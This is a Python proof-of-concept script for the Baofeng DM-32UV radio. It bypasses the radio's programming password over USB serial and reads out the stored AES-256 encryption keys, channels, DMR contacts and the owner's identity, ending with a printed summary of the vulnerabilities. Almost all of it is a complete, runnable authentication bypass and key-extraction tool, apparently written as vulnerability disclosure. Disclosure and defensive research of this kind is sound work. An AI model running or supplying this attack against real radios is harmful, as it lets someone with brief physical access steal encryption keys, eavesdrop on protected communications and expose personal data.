#!/usr/bin/env python3
"""
DM-32UV CPS Password Bypass & Data Extraction PoC
===================================================
Demonstrates that the Baofeng DM-32UV (DP570UV / HR_C7000 platform)
CPS programming password is NOT enforced by the radio firmware.

All codeplug data — including AES-256 encryption keys, channels,
contacts, and radio identity — can be read over USB without
any authentication.

Tested on: DM-32UV firmware DM32.01.L01.048 (2022-06-27)
Protocol:  UART 115200 8N1, CH340 USB-serial
"""

import serial
import time
import sys
import json

PORT = "/dev/ttyUSB0"
BAUD = 115200

# Radio pages to extract (discovered via protocol analysis)
TARGET_PAGES = {
    0x00C000: "encryption",   # AES keys + system settings
    0x00D000: "channels_1",   # Channel data (zone 1)
    0x00E000: "channels_2",   # Channel data (zone 2)
    0x05F000: "contacts",     # DMR contact list
    0x0C3000: "radio_info",   # DMR ID, callsign, owner name
}


def wait_for(ser, expected, count, timeout=1.0):
    end = time.time() + timeout
    ser.timeout = 0.05
    while time.time() < end:
        b = ser.read(1)
        if not b:
            continue
        if b[0] in expected:
            ser.timeout = min(timeout, 0.5)
            rest = ser.read(count - 1)
            return bytes([b[0]]) + rest
    return b""

def read_bulk(ser, size, timeout=15):
    ser.timeout = 0.5
    data = bytearray()
    end = time.time() + timeout
    while len(data) < size and time.time() < end:
        chunk = ser.read(size - len(data))
        if chunk:
            data.extend(chunk)
    return bytes(data)

def decode_freq(raw):
    rev = bytes(reversed(raw))
    bcd = "".join(f"{b:02X}" for b in rev)
    try:
        return int(bcd) / 100000
    except:
        return 0.0

def decode_bcd_id(raw):
    return int.from_bytes(raw, "little")


def extract(port=PORT):
    """Connect to radio, bypass auth, extract sensitive data."""
    print()
    print("  ╔══════════════════════════════════════════════════════╗")
    print("  ║  DM-32UV CPS Password Bypass & Extraction PoC      ║")
    print("  ║  No authentication required.                        ║")
    print("  ╚══════════════════════════════════════════════════════╝")
    print()

    ser = serial.Serial(port, BAUD, timeout=0.5, bytesize=8, parity="N", stopbits=1)
    time.sleep(0.8)
    ser.reset_input_buffer()
    t0 = time.time()

    # --- Phase 1: Handshake (NO password) ---
    print("  [*] Phase 1: Handshake (bypassing authentication)")

    # PSEARCH
    ser.write(b"PSEARCH"); ser.flush()
    r = wait_for(ser, {0x06}, 8, timeout=2)
    if not r or r[0] != 0x06:
        print("  [!] Radio not responding"); ser.close(); return None
    model = r[1:].decode("ascii", errors="replace").rstrip("\x00")
    print(f"      Model: {model}")

    # Skip PASSSTA/PASWORD entirely — this is the bypass
    print("      Password: SKIPPED (bypass)")

    # SYSINFO
    ser.write(b"SYSINFO"); ser.flush()
    r = wait_for(ser, {0x06}, 1, timeout=0.5)
    if not r:
        print("  [!] SYSINFO failed"); ser.close(); return None

    # V-frame 0x0D (required by state machine)
    ser.write(bytes([0x56, 0x00, 0x00, 0x40, 0x0D])); ser.flush()
    wait_for(ser, {0x56}, 67, timeout=0.5)

    # V-frames 0x01-0x10
    fw_version = ""
    for vid in range(0x01, 0x11):
        if vid == 0x0C: continue
        ser.write(bytes([0x56, 0x00, 0x00, 0x00, vid])); ser.flush()
        r = wait_for(ser, {0x56}, 3, timeout=0.3)
        if r and len(r) >= 3:
            dlen = r[2]
            if dlen > 0:
                payload = ser.read(dlen)
                if vid == 0x01:
                    fw_version = payload.decode("ascii", errors="replace").rstrip("\x00")

    print(f"      Firmware: {fw_version}")

    # G-query
    ser.write(bytes([0x47, 0x00, 0x00, 0x00, 0x00, 0x01])); ser.flush()
    wait_for(ser, {0x53}, 6, timeout=1)
    read_bulk(ser, 250, timeout=2)
    time.sleep(0.2)
    ser.timeout = 0.3; ser.read(64)

    # --- Phase 2: Enter programming mode ---
    print("  [*] Phase 2: Entering programming mode")

    ser.write(b"\xFF\xFF\xFF\xFF\x0C"); ser.flush()
    time.sleep(0.01)
    ser.write(b"PROGRAM"); ser.flush()
    r = wait_for(ser, {0x06}, 1, timeout=1)
    if not r:
        print("  [!] PROGRAM rejected"); ser.close(); return None

    ser.write(b"\x02"); ser.flush()
    r = wait_for(ser, {0xFF}, 8, timeout=2)
    if not r or len(r) < 8:
        print("  [!] Mode 02 failed"); ser.close(); return None

    ser.write(b"\x06"); ser.flush()
    r = wait_for(ser, {0x06}, 1, timeout=1)
    if not r:
        print("  [!] Confirm failed"); ser.close(); return None

    print("      Programming mode: ACTIVE")

    # --- Phase 3: Read target pages ---
    print(f"  [*] Phase 3: Reading {len(TARGET_PAGES)} target pages")

    pages = {}
    for addr, label in TARGET_PAGES.items():
        cmd = bytes([0x52, addr & 0xFF, (addr >> 8) & 0xFF, (addr >> 16) & 0xFF, 0x00, 0x10])
        ser.write(cmd); ser.flush()
        hdr = wait_for(ser, {0x57}, 6, timeout=5)
        if hdr and hdr[0] == 0x57:
            data = read_bulk(ser, 4096, timeout=15)
            pages[addr] = data
            print(f"      0x{addr:06X} ({label}): {len(data)} bytes")
        else:
            print(f"      0x{addr:06X} ({label}): FAILED")

    # END
    ser.write(b"\x45"); ser.flush()
    time.sleep(0.3)
    ser.close()

    elapsed = time.time() - t0
    print(f"      Extraction complete in {elapsed:.1f}s")

    # --- Phase 4: Parse extracted data ---
    print()
    print("  [*] Phase 4: Parsing extracted data")
    print()

    result = {"model": model, "firmware": fw_version}

    # --- Radio Info ---
    if 0x0C3000 in pages:
        p = pages[0x0C3000]
        print("  ┌─────────────────────────────────────────────┐")
        print("  │  RADIO IDENTITY                             │")
        print("  ├─────────────────────────────────────────────┤")

        # DMR ID at offset 0x010 (3 bytes LE)
        dmr_id = int.from_bytes(p[0x010:0x013], "little")
        radio_name = p[0x013:0x023].split(b"\x00")[0].decode("ascii", errors="replace")
        callsign = p[0x020:0x030].split(b"\x00")[0].decode("ascii", errors="replace")
        owner = p[0x033:0x043].split(b"\x00")[0].decode("ascii", errors="replace")

        print(f"  │  DMR ID:     {dmr_id:<30d} │")
        print(f"  │  Radio Name: {radio_name:<30s} │")
        print(f"  │  Callsign:   {callsign:<30s} │")
        print(f"  │  Owner:      {owner:<30s} │")
        print("  └─────────────────────────────────────────────┘")
        print()

        result["dmr_id"] = dmr_id
        result["radio_name"] = radio_name
        result["callsign"] = callsign
        result["owner"] = owner

    # --- Encryption Keys ---
    if 0x00C000 in pages:
        p = pages[0x00C000]
        print("  ┌─────────────────────────────────────────────┐")
        print("  │  ENCRYPTION KEYS (AES-256)                  │")
        print("  ├─────────────────────────────────────────────┤")

        result["keys"] = []
        # Scan for key entries: pattern is name(var) + \x00 + type(0x04) + 32 bytes
        # Key area starts at offset 0x300
        key_area = p[0x2FC:]
        i = 0
        while i < len(key_area) - 40:
            # Look for key count/marker byte followed by printable name
            if key_area[i] > 0 and key_area[i] < 0x20:
                # Might be a key count or entry marker
                name_start = i + 1
                # Find null terminator
                null_pos = key_area.find(b"\x00", name_start)
                if null_pos > name_start and null_pos - name_start <= 20:
                    name = key_area[name_start:null_pos].decode("ascii", errors="replace")
                    if all(32 <= ord(c) < 127 for c in name) and len(name) >= 2:
                        # After the name+null, look for key type marker
                        after_name = null_pos + 1
                        # Scan forward for type byte 0x04 (AES-256)
                        for j in range(after_name, min(after_name + 16, len(key_area) - 33)):
                            if key_area[j] == 0x04:
                                key_data = key_area[j+1:j+33]
                                if any(b != 0x00 and b != 0xFF for b in key_data):
                                    key_hex = key_data.hex().upper()
                                    key_ascii = "".join(chr(b) if 32 <= b < 127 else "." for b in key_data)
                                    print(f"  │  Name: {name:<38s} │")
                                    print(f"  │  Key:  {key_hex[:32]:<38s} │")
                                    print(f"  │        {key_hex[32:]:<38s} │")
                                    print(f"  │  ASCII: {key_ascii:<37s} │")
                                    print(f"  │{'─'*45}│")
                                    result["keys"].append({"name": name, "hex": key_hex, "ascii": key_ascii})
                                    i = j + 33
                                    break
                                elif all(b == 0x00 for b in key_data):
                                    print(f"  │  Name: {name:<38s} │")
                                    print(f"  │  Key:  (empty / not programmed){' ':>7s} │")
                                    print(f"  │{'─'*45}│")
                                    result["keys"].append({"name": name, "hex": "(empty)"})
                                    i = j + 33
                                    break
                        else:
                            i = null_pos + 1
                            continue
                        continue
            i += 1

        if not result["keys"]:
            print("  │  No encryption keys found                  │")
        print("  └─────────────────────────────────────────────┘")
        print()

    # --- Channels ---
    result["channels"] = []
    print("  ┌─────────────────────────────────────────────────────────────────┐")
    print("  │  CHANNELS                                                      │")
    print("  ├────┬──────────────────┬─────────────┬─────────────┬────────────┤")
    print("  │ #  │ Name             │ RX (MHz)    │ TX (MHz)    │ Mode       │")
    print("  ├────┼──────────────────┼─────────────┼─────────────┼────────────┤")

    ch_num = 0
    for page_addr in [0x00D000, 0x00E000]:
        if page_addr not in pages:
            continue
        p = pages[page_addr]
        # Channel records: 48 bytes each, name at offset 0, freq at offset 0x10
        for rec_off in range(0, len(p) - 48, 48):
            rec = p[rec_off:rec_off + 48]
            # Check if record has a valid name (starts with printable ASCII)
            if rec[0] < 0x20 or rec[0] > 0x7E:
                continue
            name = rec[0:16].split(b"\x00")[0].split(b"\xff")[0].decode("ascii", errors="replace").strip()
            if len(name) < 2:
                continue
            rx = decode_freq(rec[0x10:0x14])
            tx = decode_freq(rec[0x14:0x18])
            if rx < 100 or rx > 600:
                continue

            # Determine mode from settings
            mode = "FM" if rec[0x18] & 0x10 else "DMR"
            ch_num += 1
            print(f"  │{ch_num:3d} │ {name:<16s} │ {rx:11.5f} │ {tx:11.5f} │ {mode:<10s} │")
            result["channels"].append({"name": name, "rx": rx, "tx": tx, "mode": mode})

    print("  └────┴──────────────────┴─────────────┴─────────────┴────────────┘")
    print()

    # --- Contacts ---
    if 0x05F000 in pages:
        p = pages[0x05F000]
        print("  ┌───────────────────────────────────────────────────┐")
        print("  │  DMR CONTACTS                                    │")
        print("  ├──────────────────┬──────────┬────────────────────┤")
        print("  │ Name             │ DMR ID   │ Type               │")
        print("  ├──────────────────┼──────────┼────────────────────┤")

        result["contacts"] = []
        # Contact records: 24 bytes, name(16) + reserved(1) + ID(3) + type(1) + flags(3)
        # Table starts at offset 2 (2-byte header)
        for rec_off in range(2, len(p) - 24, 24):
            rec = p[rec_off:rec_off + 24]
            name = rec[0:16].split(b"\x00")[0].decode("ascii", errors="replace").strip()
            if len(name) < 2 or not all(32 <= ord(c) < 127 for c in name):
                continue
            dmr_id = int.from_bytes(rec[17:20], "little")
            call_type_byte = rec[20]
            if dmr_id == 0 or dmr_id > 16777215:
                continue
            call_type = {0x04: "Group", 0x05: "All Call", 0x00: "Private"}.get(call_type_byte, f"0x{call_type_byte:02X}")
            print(f"  │ {name:<16s} │ {dmr_id:>8d} │ {call_type:<18s} │")
            result["contacts"].append({"name": name, "dmr_id": dmr_id, "type": call_type})

        print("  └──────────────────┴──────────┴────────────────────┘")
        print()

    # --- Summary ---
    print("  ╔══════════════════════════════════════════════════════╗")
    print("  ║  VULNERABILITY SUMMARY                              ║")
    print("  ╠══════════════════════════════════════════════════════╣")
    print("  ║  1. CPS password check is SOFTWARE-ONLY             ║")
    print("  ║     Radio firmware does NOT enforce authentication   ║")
    print("  ║                                                      ║")
    print("  ║  2. AES-256 encryption keys stored in PLAINTEXT     ║")
    print("  ║     Key names and full 32-byte values readable      ║")
    print("  ║                                                      ║")
    print("  ║  3. Full codeplug extraction in ~10 seconds         ║")
    print("  ║     No physical disassembly required — USB only     ║")
    print("  ║                                                      ║")
    print("  ║  4. Radio identity (DMR ID, callsign, owner)        ║")
    print("  ║     Channel list and contact database exposed       ║")
    print("  ╚══════════════════════════════════════════════════════╝")
    print()

    return result


if __name__ == "__main__":
    port = sys.argv[1] if len(sys.argv) > 1 else PORT
    result = extract(port)
    if result:
        with open("poc_output.json", "w") as f:
            json.dump(result, f, indent=2)
        print(f"  JSON output saved to poc_output.json")
